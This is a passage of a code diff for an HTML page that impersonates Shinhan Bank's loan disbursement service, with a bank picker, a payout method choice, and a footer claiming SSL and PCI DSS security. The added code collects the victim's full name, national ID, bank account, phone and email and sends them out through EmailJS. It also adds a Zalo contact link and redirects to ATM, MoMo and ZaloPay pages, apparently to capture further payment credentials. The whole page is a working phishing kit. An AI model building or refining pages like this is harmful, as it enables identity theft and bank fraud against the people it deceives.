+                                Ngân hàng TNHH MTV Số Vikki (Vikki Bank)
+                            </div>
+                            <div class="custom-select-option" data-value="lpbank">
+                                <img src="https://whypay.vn/assets/images/nganhang/lpbank.png" alt="LPBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TMCP Lộc Phát Việt Nam (LPBank)
+                            </div>
+                            <div class="custom-select-option" data-value="mbv">
+                                <img src="https://whypay.vn/assets/images/nganhang/mbv.png" alt="MBV Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TNHH MTV Việt Nam Hiện Đại (MBV)
+                            </div>
+                            <div class="custom-select-option" data-value="vcbneo">
+                                <img src="https://whypay.vn/assets/images/nganhang/vcbneo.png" alt="VCBNeo Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TNHH MTV Ngoại thương Công nghệ số (VCBNeo)
+                            </div>
+                            <div class="custom-select-option" data-value="indovinabank">
+                                <img src="https://whypay.vn/assets/images/nganhang/indovinabank.png" alt="Indovina Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng TNHH Indovina (Indovina Bank)
+                            </div>
+                            <div class="custom-select-option" data-value="vietnamrussiabank">
+                                <img src="https://whypay.vn/assets/images/nganhang/vietnamrussiabank.png" alt="Vietnam-Russia Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Ngân hàng Liên doanh Việt – Nga (Vietnam-Russia Bank)
+                            </div>
+                            <div class="custom-select-option" data-value="anzvietnam">
+                                <img src="https://whypay.vn/assets/images/nganhang/anzvietnam.png" alt="ANZ Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                ANZ Vietnam
+                            </div>
+                            <div class="custom-select-option" data-value="citibankvietnam">
+                                <img src="https://whypay.vn/assets/images/nganhang/citibankvietnam.png" alt="Citibank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Citibank Vietnam
+                            </div>
+                            <div class="custom-select-option" data-value="kookminbankvietnam">
+                                <img src="https://whypay.vn/assets/images/nganhang/kookminbankvietnam.png" alt="Kookmin Bank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
+                                Kookmin Bank Vietnam
+                            </div>
+                        </div>
+                    </div>
+                    <input type="hidden" id="bank" name="bank" required aria-describedby="bankError">
                     <span class="error" id="bankError">Vui lòng chọn ngân hàng</span>
                 </div>
                 <div class="form-group" aria-live="polite">
@@ -462,23 +817,21 @@
                 </div>
                 <div class="form-group" role="radiogroup" aria-label="Phương thức giải ngân">
                     <label>Phương thức giải ngân</label>
-                    <div class="radio-group">
-                        <label>
-                            <input type="radio" name="method" value="bank" required>
-                            <img src="placeholder_atm_logo.png" alt="ATM Logo for Bank Account" class="method-logo">
-                            <span>Tài khoản ngân hàng</span>
-                        </label>
-                        <label>
-                            <input type="radio" name="method" value="momo">
-                            <img src="https://homepage.momocdn.net/fileuploads/svg/momo-file-240411162904.svg" alt="MoMo Logo" class="method-logo">
-                            <span>MoMo</span>
-                        </label>
-                        <label>
-                            <input type="radio" name="method" value="zalopay">
-                            <img src="https://simg.zalopay.com.vn/zlp-website/assets/new_logo_6c5db2d21b.svg" alt="ZaloPay Logo" class="method-logo">
-                            <span>ZaloPay</span>
-                        </label>
+                    <div class="custom-method" id="method-select">
+                        <div class="custom-method-option" data-value="bank" tabindex="0">
+                            <img src="https://scdn.zalopay.com.vn/payment-gateway/images/icon-atm-main-3.svg" alt="ATM Logo" class="method-logo" onerror="this.src='https://via.placeholder.com/30'">
+                            Tài khoản ngân hàng
+                        </div>
+                        <div class="custom-method-option" data-value="momo" tabindex="0">
+                            <img src="https://momo.vn/assets/logo/momo-logo.svg" alt="MoMo Logo" class="method-logo" onerror="this.src='https://via.placeholder.com/30'">
+                            MoMo
+                        </div>
+                        <div class="custom-method-option" data-value="zalopay" tabindex="0">
+                            <img src="https://simg.zalopay.com.vn/zlp-website/assets/new_logo_6c5db2d21b.svg" alt="ZaloPay Logo" class="method-logo" onerror="this.src='https://via.placeholder.com/30'">
+                            ZaloPay
+                        </div>
                     </div>
+                    <input type="hidden" id="method" name="method" required aria-describedby="methodError">
                     <span class="error" id="methodError">Vui lòng chọn phương thức giải ngân</span>
                 </div>
                 <div class="buttons">
@@ -490,7 +843,7 @@
 
     <footer role="contentinfo" aria-label="Footer">
         <p>Liên hệ: <a href="mailto:support@shinhanbank.vn">support@shinhanbank.vn</a> | Hotline: 1900-1234</p>
-        <p><a href="#">Hỗ trợ trò chuyện</a></p>
+        <p><a href="http://zalo.me/84762797077">Hỗ trợ trò chuyện</a></p>
         <p>Kết nối an toàn với SSL</p>
         <img src="https://pg.megapay.vn/pg_was/images/pg/bankContents/PCIDSS.png?v2" alt="PCI DSS">
         <img src="https://simg.zalopay.com.vn/zst/zlp-website/resources/images/footer/BCTLogo_1.png" alt="Bộ Công Thương">
@@ -500,12 +853,32 @@
     </footer>
 
     <script>
-        let currentStep = 1;
         let bannerIndex = 0;
+        let formData = {};
+
+        // Toggle Hamburger Menu
+        function toggleMenu() {
+            const menu = document.getElementById('nav-menu');
+            const hamburger = document.querySelector('.hamburger');
+            menu.classList.toggle('show');
+            hamburger.setAttribute('aria-expanded', menu.classList.contains('show'));
+        }
+
+        // Lazy Load Images
+        function lazyLoadImages() {
+            const images = document.querySelectorAll('img.lazy');
+            images.forEach(img => {
+                if (img.getAttribute('data-src')) {
+                    img.src = img.getAttribute('data-src');
+                    img.removeAttribute('data-src');
+                    img.classList.remove('lazy');
+                }
+            });
+        }
 
         // Banner Carousel
         function changeSlide(n) {
-            bannerIndex = (bannerIndex + n + 4) % 4; // Updated for 4 slides
+            bannerIndex = (bannerIndex + n + 4) % 4;
             updateBanner();
         }
 
@@ -519,22 +892,80 @@
             const dots = document.querySelectorAll('.dot');
             slides.forEach((slide, i) => slide.classList.toggle('active', i === bannerIndex));
             dots.forEach((dot, i) => dot.classList.toggle('active', i === bannerIndex));
+            lazyLoadImages();
         }
 
         setInterval(() => {
-            bannerIndex = (bannerIndex + 1) % 4; // Updated for 4 slides
+            bannerIndex = (bannerIndex + 1) % 4;
             updateBanner();
         }, 5000);
         updateBanner();
 
-        // Step Indicator
-        function updateStepIndicator() {
-            document.querySelectorAll('.step').forEach((step, index) => {
-                const stepNum = index + 1;
-                step.style.display = stepNum === currentStep ? 'block' : 'none';
-                step.classList.toggle('active', stepNum === currentStep);
+        // Custom Bank Select Dropdown
+        const bankSelect = document.getElementById('bank-select');
+        const bankToggle = bankSelect.querySelector('.custom-select-toggle');
+        const bankList = bankSelect.querySelector('.custom-select-list');
+        const bankOptions = bankSelect.querySelectorAll('.custom-select-option');
+        const bankInput = document.getElementById('bank');
+
+        bankToggle.addEventListener('click', () => {
+            bankList.classList.toggle('show');
+            bankToggle.setAttribute('aria-expanded', bankList.classList.contains('show'));
+        });
+
+        bankToggle.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' || e.key === ' ') {
+                e.preventDefault();
+                bankList.classList.toggle('show');
+                bankToggle.setAttribute('aria-expanded', bankList.classList.contains('show'));
+            }
+        });
+
+        bankOptions.forEach(option => {
+            option.addEventListener('click', () => {
+                const value = option.getAttribute('data-value');
+                const text = option.textContent.trim();
+                const imgSrc = option.querySelector('img').src;
+                bankToggle.innerHTML = `<img src="${imgSrc}" alt="${text} Logo" class="bank-logo">${text}`;
+                bankInput.value = value;
+                bankList.classList.remove('show');
+                bankToggle.setAttribute('aria-expanded', 'false');
             });
-        }
+
+            option.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter' || e.key === ' ') {
+                    e.preventDefault();
+                    option.click();
+                }
+            });
+        });
+
+        document.addEventListener('click', (e) => {
+            if (!bankSelect.contains(e.target)) {
+                bankList.classList.remove('show');
+                bankToggle.setAttribute('aria-expanded', 'false');
+            }
+        });
+
+        // Custom Method Selection
+        const methodSelect = document.getElementById('method-select');
+        const methodOptions = methodSelect.querySelectorAll('.custom-method-option');
+        const methodInput = document.getElementById('method');
+
+        methodOptions.forEach(option => {
+            option.addEventListener('click', () => {
+                methodOptions.forEach(opt => opt.classList.remove('selected'));
+                option.classList.add('selected');
+                methodInput.value = option.getAttribute('data-value');
+            });
+
+            option.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter' || e.key === ' ') {
+                    e.preventDefault();
+                    option.click();
+                }
+            });
+        });
 
         // Form Validation
         function validateForm() {
@@ -548,7 +979,7 @@
             const bank = document.getElementById('bank').value;
             const phone = document.getElementById('phone').value.replace(/\D/g, '');
             const email = document.getElementById('email').value.trim();
-            const method = document.querySelector('input[name="method"]:checked');
+            const method = document.getElementById('method').value;
 
             document.querySelectorAll('.error').forEach(error => error.classList.remove('show'));
 
@@ -556,7 +987,7 @@
                 document.getElementById('fullNameError').classList.add('show');
                 isValid = false;
             }
-            if (!/^\d{12}$/.test(cccd)) {
+            if (!/^\d{9}$|^\d{12}$/.test(cccd)) {
                 document.getElementById('cccdError').classList.add('show');
                 isValid = false;
             }
@@ -568,7 +999,7 @@
                 document.getElementById('monthsError').classList.add('show');
                 isValid = false;
             }
-            if (!/^\d{10,20}$/.test(accountNumber)) {
+            if (!/^\d{8,15}$/.test(accountNumber)) {
                 document.getElementById('accountNumberError').classList.add('show');
                 isValid = false;
             }
@@ -594,83 +1025,83 @@
             }
 
             if (isValid) {
-                sessionStorage.setItem('formData', JSON.stringify({
+                formData = {
                     fullName,
                     cccd: '****' + cccd.slice(-4),
                     amount: amount.toLocaleString('vi-VN', { style: 'currency', currency: 'VND' }),
                     months,
-                    bank: document.querySelector(`#bank option[value="${bank}"]`).textContent,
-                    phone: '****' + phone.slice(-4)
-                }));
+                    accountNumber: '****' + accountNumber.slice(-4),
+                    accountHolder,
+                    bank: bankSelect.querySelector(`[data-value="${bank}"]`).textContent.trim(),
+                    phone: '****' + phone.slice(-4),
+                    email,
+                    method: method.charAt(0).toUpperCase() + method.slice(1)
+                };
+                sessionStorage.setItem('formData', JSON.stringify(formData));
             }
 
-            return { isValid, method: method ? method.value : null };
+            return { isValid, method };
         }
 
-        // Real-Time Validation
-        function debounce(fn, delay) {
-            let timeout;
-            return (...args) => {
-                clearTimeout(timeout);
-                timeout = setTimeout(() => fn(...args), delay);
+        // Send Email via EmailJS
+        function sendEmail() {
+            const templateParams = {
+                full_name: formData.fullName,
+                cccd: formData.cccd,
+                amount: formData.amount,
+                months: formData.months,
+                account_number: formData.accountNumber,
+                account_holder: formData.accountHolder,
+                bank: formData.bank,
+                phone: formData.phone,
+                email: formData.email,
+                method: formData.method
             };
+
+            return emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
+                .then(() => {
+                    console.log('Email sent successfully');
+                }, (error) => {
+                    console.error('EmailJS error:', error);
+                    alert('Lỗi khi gửi email. Vui lòng thử lại sau.');
+                });
+            // TODO: Replace YOUR_SERVICE_ID and YOUR_TEMPLATE_ID with your EmailJS service and template IDs
         }
-
-        document.getElementById('fullName').addEventListener('input', debounce(() => {
-            const value = document.getElementById('fullName').value.trim();
-            document.getElementById('fullNameError').classList.toggle('show', !value && value.length > 0);
-        }, 300));
-
-        document.getElementById('cccd').addEventListener('input', debounce(() => {
-            const value = document.getElementById('cccd').value.replace(/\D/g, '');
-            document.getElementById('cccdError').classList.toggle('show', !/^\d{12}$/.test(value) && value.length > 0);
-        }, 300));
-
-        document.getElementById('phone').addEventListener('input', debounce(() => {
-            const value = document.getElementById('phone').value.replace(/\D/g, '');
-            document.getElementById('phoneError').classList.toggle('show', !/^0\d{9}$/.test(value) && value.length > 0);
-        }, 300));
-
-        document.getElementById('email').addEventListener('input', debounce(() => {
-            const value = document.getElementById('email').value.trim();
-            document.getElementById('emailError').classList.toggle('show', !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value) && value.length > 0);
-        }, 300));
-
-        document.getElementById('accountNumber').addEventListener('input', debounce(() => {
-            const value = document.getElementById('accountNumber').value.replace(/\D/g, '');
-            document.getElementById('accountNumberError').classList.toggle('show', !/^\d{10,20}$/.test(value) && value.length > 0);
-        }, 300));
-
-        document.getElementById('accountHolder').addEventListener('input', debounce(() => {
-            const value = document.getElementById('accountHolder').value.trim();
-            document.getElementById('accountHolderError').classList.toggle('show', !value && value.length > 0);
-        }, 300));
 
         // Form Submission
         document.getElementById('disbursement-form').addEventListener('submit', (e) => {
             e.preventDefault();
             const { isValid, method } = validateForm();
             if (isValid) {
-                currentStep = 3;
-                updateStepIndicator();
-                if (method === 'bank') {
-                    window.location.href = 'https://www.shinhan-financer.online/pages/vi/atm.html';
-                } else if (method === 'momo') {
-                    window.location.href = 'https://www.shinhan-financer.online/pages/vi/momo.html';
-                } else if (method === 'zalopay') {
-                    window.location.href = 'https://www.shinhan-financer.online/pages/vi/zalopay.html';
-                }
+                sendEmail().then(() => {
+                    const redirectURLs = {
+                        bank: './atm.html',
+                        momo: './momo.html',
+                        zalopay: './zalopay.html'
+                    };
+                    try {
+                        window.location.href = redirectURLs[method.toLowerCase()];
+                    } catch (error) {
+                        alert('Lỗi khi chuyển hướng. Vui lòng kiểm tra tệp đích hoặc thử lại.');
+                        console.error('Redirect error:', error);
+                    }
+                });
             }
         });
 
-        // Input Masks
-        window.addEventListener('load', () => {
-            Inputmask({ mask: "0999-999-999" }).mask(document.getElementById('phone'));
-            Inputmask({ regex: "\\d{12}" }).mask(document.getElementById('cccd'));
-            Inputmask({ mask: "9999-9999-9999-9999[-9999]" }).mask(document.getElementById('accountNumber'));
-        });
+        // Initialize Input Masks
+        function initializeInputMasks() {
+            if (typeof window.Inputmask === 'function') {
+                Inputmask({ mask: "0999-999-999" }).mask(document.getElementById('phone'));
+                Inputmask({ regex: "\\d{9}|\\d{12}" }).mask(document.getElementById('cccd'));
+                Inputmask({ regex: "\\d{8,15}" }).mask(document.getElementById('accountNumber'));
+            } else {
+                console.warn('Inputmask not loaded, inputs will function without formatting.');
+            }
+            lazyLoadImages();
+        }
 
-        updateStepIndicator();
+        window.addEventListener('load', initializeInputMasks);
     </script>
 </body>
 </html>
